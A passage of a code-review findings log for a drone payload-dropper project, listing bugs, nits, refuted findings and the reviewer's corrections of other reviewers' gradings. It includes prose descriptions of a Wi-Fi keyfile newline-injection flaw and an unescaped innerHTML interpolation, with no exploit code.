+- `uno_q/find_pixhawk_uart.py:58` listen() times its sampling window with wall-clock time.time() instead of a monotonic clock. If the system clock is adjusted during the listen window (e.g. an NTP correction shortly after boot on a board with no RTC, which is a realistic scenario for the UNO Q this script targets), a backward jump can make the loop run far longer than LISTEN_S, and a forward jump can make it exit almost immediately -- sampling far less than 3 seconds of the port and understating byte/magic counts for that
+- `uno_q/mavlink_io.py:45` Module comment claims gate travel is 560/1760us with margin, but dropper.py actually uses 500/1600us (zero margin on the closed side). A maintainer trusting this comment (believing the real closed value is 560, 60us inside the 500 bound) could tighten PWM_MIN_US to e.g. 550 assuming that still leaves margin -- but the real closed_us used by dropper.py is 500, so that change would make PixhawkServoDropper.__init__'s own range check (dropper.py lines 78-81) reject the real closed_us and raise ValueError, breaking the gate at constr
+- `uno_q/run_mission.py:68` --drop-alt default contradicts the comment explaining its value. Anyone reading the comment to understand why drop-alt is what it is gets a false explanation; anyone relying on the comment to know the intended safe default (e.g. after a merge or refactor accidentally changed the literal) would not notice `1.0` is wrong, since nothing here flags the mismatch. Per this project's own rule that decisions must keep their why, a bare number that no longer matches its
+- `uno_q/start_dashboard.sh:31` start_dashboard.sh never logs its own stop/start actions or failures to a log file. If start_dashboard.sh is run over ssh at the field and the launch fails (or silently serves stale code, see the sibling race-condition finding), and that ssh session is closed without the operator copying the terminal output, there is zero persisted record anywhere of the restart attempt or its failure - the project's own SCOPE RULE 1 requires scripts that run on the board to log everything, not j
+- `uno_q/wifi.py:170` Wi-Fi password is written unescaped into the nmcli keyfile, allowing an embedded newline to inject extra keyfile lines. A password value containing '\n' (accepted as-is; nothing in this file restricts it) terminates the intended psk line early and adds one or more additional lines to the file, letting the submitted value set or override other keys that `nmcli connection up ... passwd-file` reads, rather than being treated purely as the PSK secret.
+
+**NIT**
+- `tools/sik.py:123` Printed baud-sweep time estimate omits the 0.5s ATI probe baked into command_mode(). A user sweeping all 6 BAUDS entries sees an estimate of ~14.4s total but the sweep actually takes ~17.4s; not harmful, just a printed number that doesn't match the code's own timing.
+- `uno_q/basestation/dashboard.py:86` Several open() calls on text/JSON data omit encoding=. On a board/locale where the default text encoding is not UTF-8, reading a mission JSONL line, a waypoint file, or a wifi-related JSON blob containing non-ASCII bytes (e.g. an operator note with a stray character) could raise UnicodeDecodeError or silently mis-decode instead of behaving consistently regardless of the host's locale settings.
+- `uno_q/basestation/gen_fake_mission.py:92` Drop event's simulated rangefinder reading is a hardcoded literal, not derived from DROP_ALT. If DROP_ALT is changed (e.g. to reflect a new drop altitude for the real mission), the generated fake mission data's 'drop' events will keep reporting rng=2.96 regardless, so the demo dataset's rangefinder reading at the moment of drop no longer matches the altitude the rest of the same event's fixes show, producing internally inconsistent fake data for anyone using it to develop/test the dashboar
+- `uno_q/boardlog.py:102` open() without explicit encoding=. Log messages could contain non-ASCII text (e.g. from a library exception message via captured stderr); without an explicit encoding, output encoding depends on the process locale rather than being guaranteed.
+- `uno_q/deploy/board_setup.sh:104` multi-line bash string literal bakes a stray newline and 8 spaces of indentation into the printed message. When this MISS line prints, the message reads with an embedded line break and 8 stray spaces mid-sentence ('...so this means the\n        repo has not synced yet...') instead of one clean sentence.
+- `uno_q/diag_dashboard.sh:28` diagnostic pgrep also unanchored to the dashboard's own path. If an unrelated python process on the board matches the substring, this diagnostic script would report its PID/start-time/uptime as if it were the base-station dashboard, misleading whoever is reading the pasted diagnostic output.
+- `uno_q/mission.py:210` Degenerate fence-projection case silently disables the fence check with no log. In the essentially unreachable case of a fence polygon anchored near the poles, every detection would pass the fence check unconditionally and silently, with nothing in the log to indicate the fence check was bypassed for this reason (versus the 'no fence file' case, which does log).
+- `uno_q/mission.py:248` Incomplete/garbled log message. Whoever reads run_mission.log while diagnosing a failed launch sees a sentence that doesn't parse, adding confusion at exactly the moment clarity matters most.
+- `uno_q/missionlog.py:46` open() without explicit encoding=. Low practical risk here since `json.dumps()` defaults to `ensure_ascii=True` (pure-ASCII output), but the file's encoding is still implicitly locale-dependent rather than guaranteed, which could bite if that default is ever changed.
+- `uno_q/run_mission.py:35` open() without explicit encoding=. A waypoint file containing non-ASCII characters (e.g. in a stray comment) could be read differently depending on the process locale.
+- `uno_q/spotcheck_onnx.py:108` Reported "median" inference time is not a true median for even sample counts. For an even number of images, the printed 'median' is actually the upper of the two middle values, which can differ from the true median, especially with a small/odd-shaped batch -- a minor but avoidable inconsistency with the other two benchmarking scripts in the same directory.
+- `uno_q/test_everything.py:415` JSON/probe file writes omit encoding=. Not currently triggering on the board's UTF-8 locale, but any future non-ASCII text in a component detail string (e.g. a sensor name or firmware message) would be encoded with whatever `locale.getpreferredencoding()` resolves to at runtime rather than a guaranteed UTF-8, which is inconsistent between environments.
+
+**REFUTED by the verify pass, recorded so they are not re-litigated**
+- `uno_q/basestation/static/index.html:2365` genRows/genLen sent with unary + and no empty-string guard, unlike the sibling generate inputs -> The client-side observation is accurate (genRows/genLen use bare unary + with no empty-string guard, unlike genSp/genInset/genHdg), but the claimed failure does not occur: dashboard.py's api_waypoints_generate (lines 378-410) validates `1 <= rows <= 25` and `2
+- `uno_q/run_mission.py:159` Dry-run polling loop has no sleep/throttle -> The loop body is `io.step()` then `detector.poll(...)`. io.step() (mavlink_io.py) calls `self.conn.recv_match(blocking=True, timeout=max_wait)` with max_wait=0.02, which blocks waiting on the socket/serial read for up to 20ms per call rather than busy-spinning
+- `uno_q/detector.py:133` Rangefinder AGL branch skips the positivity check its EKF sibling has -> The code gap (no explicit tel.rng_m>0 check, unlike the rel_alt_m branch) is real, but the claimed crash scenario is unreachable: mavlink_io.py sets tel.rng_valid = (msg.min_distance < msg.current_distance < msg.max_distance) from the DISTANCE_SENSOR message, 
+- `uno_q/detector.py:273` Detection confidence threshold is split across two independently-configured processes with no consistency check -> run_mission.py's _spawn_or_reuse_worker() explicitly guards against exactly this: it reads the leftover worker's published 'conf' from the det_file, compares it to args.conf (the same value later passed to FileDetector(conf=args.conf)), and if they differ it k
+- `uno_q/detector.py:217` OnnxDetector never releases its V4L2 camera handle -> OnnxDetector genuinely has no close()/release() method and self._grab = self._grab_camera does create a reference cycle (self -> bound method -> self), both true as stated. But the claimed failure requires 'a caller that discards one OnnxDetector and promptly 
+
+TWO GRADINGS I CORRECT AGAINST THE AGENTS' (I read the source myself):
+- `index.html:1870` innerHTML: the unescaped interpolation is REAL and there is
+  no escape helper anywhere in the file, but the verifier's "an attacker sets
+  the abort reason" scenario is NOT reachable. Every interpolated value
+  (abort reason, drop fields, mission id) is server-generated from a fixed
+  vocabulary in mission.py, and mission ids are regex-gated. It is hygiene
+  (one `esc()` helper), not a vulnerability. Downgraded to LOW.
+- `dropper.py:122` negative dwell: `Dropper(dwell_s=...)` is only ever
+  constructed by run_mission.py:180 with the class default, and every per-call
+  dwell comes from `mission.dose_for()`, clamped to [0.3, 3.0], and then
+  through `max(0.05, ...)` again. flow_test.py never constructs a Dropper.
+  Unreachable; a hardening note, not a bug. Downgraded to LOW.
+And TWO WHERE I WAS WRONG AND THE AGENTS WERE RIGHT, recorded honestly:
+- I initially refuted `test_everything.py:122` on the grounds that report()
+  appends to `results`. It does, but only past `want = lambda name: name in
+  plan` (line 103), and `plan` is `COMPONENTS`, which does not contain
+  'mission-clash'. So `want('mission-clash')` is ALWAYS False and the refusal
+  is genuinely dropped: no log line, no results row, and `_finish` then writes
+  an empty result set that reads as a clean run. The agent was right.
+- I initially called the ESP32 `maintain()` finding a nit. config.h:162 records
+  a MEASURED "12 stalls totalling 12.9 s, 22% of the time, each 1.07 s: exactly
+  one retry per 5 s". The per-channel retry during a whole-bus-down is the
+  measured behaviour, not a theoretical one, and 1.07 s exceeds ArduPilot's
+  500 ms proximity timeout. The agent was right.
+
+NOTHING IN THIS ENTRY WAS FIXED. Per SCOPE RULE 2 and 3 the user owns what gets
+fixed and in what order; this is a findings record only.
